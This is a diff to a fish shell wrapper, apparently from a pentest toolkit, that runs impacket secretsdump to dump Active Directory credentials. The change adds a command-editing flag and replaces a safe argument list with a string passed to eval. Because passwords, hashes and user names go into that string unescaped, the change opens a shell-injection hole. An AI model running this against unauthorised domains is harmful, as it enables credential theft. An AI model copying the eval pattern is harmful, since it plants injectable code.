@@ -5,7 +5,7 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
         set wizard 1
     end
 
-    argparse h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos t/target-user= w/wizard -- $argv
+    argparse h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos t/target-user= X/edit-cmd w/wizard -- $argv
     or return 1
 
     if set -q _flag_help
@@ -20,6 +20,7 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
         echo "  -H, --hash HASH         Auth NTLM hash"
         echo "  -d, --domain DOMAIN     Target domain name"
         echo "  -k, --kerberos          Use Kerberos authentication"
+        echo "  -X, --edit-cmd          Inspect and edit the command before execution"
         echo "  -q, --quiet             Skip prompts and use cached/default values"
         echo "  -h, --help              Show this help message"
         return 0
@@ -117,26 +118,30 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
     else if command -v impacket-secretsdump >/dev/null; set impacket_cmd impacket-secretsdump
     else; echo "error: secretsdump not found."; return 1; end
 
-    set -l dump_args
-    if test -n "$TGT_DC_IP"; set -a dump_args -dc-ip "$TGT_DC_IP"
-    else if test -n "$TGT_DC"; set -a dump_args -dc-ip "$TGT_DC"; end
+    set -l dump_cmd "$impacket_cmd"
+    if test -n "$TGT_DC_IP"; set dump_cmd "$dump_cmd -dc-ip \"$TGT_DC_IP\""
+    else if test -n "$TGT_DC"; set dump_cmd "$dump_cmd -dc-ip \"$TGT_DC\""; end
 
     if test -n "$target_user"
-        set -a dump_args -just-dc-user "$target_user"
+        set dump_cmd "$dump_cmd -just-dc-user \"$target_user\""
     end
 
     if set -q _flag_kerberos
-        set -a dump_args -k -no-pass "$domain/$auth_user@$target"
+        set dump_cmd "$dump_cmd -k -no-pass \"$domain/$auth_user@$target\""
     else if test -n "$auth_hash"
-        set -a dump_args -hashes "$auth_hash" "$domain/$auth_user@$target"
+        set dump_cmd "$dump_cmd -hashes \"$auth_hash\" \"$domain/$auth_user@$target\""
     else
         if test -z "$auth_user"; or test -z "$auth_pass"
              echo "error: credentials required"; return 1
         end
-        set -a dump_args "$domain/$auth_user:$auth_pass@$target"
+        set dump_cmd "$dump_cmd \"$domain/$auth_user:$auth_pass@$target\""
+    end
+
+    if set -q _flag_edit_cmd
+        set dump_cmd (__kronos_edit_cmd "$dump_cmd"); or return 1
     end
 
     __kronos_check_dep $impacket_cmd; or return 1
     echo "[*] Dumping secrets via $impacket_cmd..."
-    command $impacket_cmd $dump_args
+    eval $dump_cmd
 end
